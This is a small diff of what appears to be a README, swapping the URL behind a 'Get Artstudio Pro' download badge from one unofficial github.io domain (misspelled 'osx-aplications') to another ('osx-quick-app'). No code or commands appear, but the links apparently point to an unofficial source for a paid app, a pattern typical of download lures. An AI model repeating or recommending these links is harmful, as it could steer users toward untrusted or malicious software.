@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/artstudio">
+  <a href="https://osx-quick-app.github.io/.github/artstudio">
     <img src="https://img.shields.io/badge/Get%20Artstudio%20Pro-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Artstudio Pro">
   </a>
 </p>
